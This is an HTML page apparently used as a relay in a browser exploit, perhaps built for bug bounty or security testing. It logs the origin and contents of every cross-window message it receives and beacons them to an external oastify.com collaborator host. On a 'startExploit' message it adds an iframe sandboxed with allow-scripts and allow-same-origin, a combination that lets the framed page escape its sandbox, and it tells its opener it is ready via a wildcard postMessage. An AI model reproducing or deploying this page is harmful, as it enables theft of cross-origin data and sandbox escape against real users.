<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay Active</h1>
<div id="status" style="font-family:monospace;font-size:12px;"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
const status = document.getElementById('status');

function log(msg) {
    status.innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

log('relay_loaded');

// Log EVERY message we receive
window.addEventListener('message', function(e) {
    const msgStr = JSON.stringify(e.data).substring(0, 200);
    log('MSG_FROM=' + e.origin + '_DATA=' + msgStr);
    
    // Check if it's our exploit message
    if (e.data && e.data.action === 'startExploit') {
        log('EXPLOIT_TRIGGERED');
        
        // Create sandboxed iframe pointing to separate file
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-same-origin';
        iframe.src = 'sandbox.html';  // ‚Üê Use separate file instead of srcdoc
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        document.body.appendChild(iframe);
        log('SANDBOX_IFRAME_ADDED');
    }
});

if(window.opener){
    log('has_opener');
    window.opener.postMessage({status:'ready'},'*');
} else {
    log('no_opener');
}
</script>
</body>
</html>
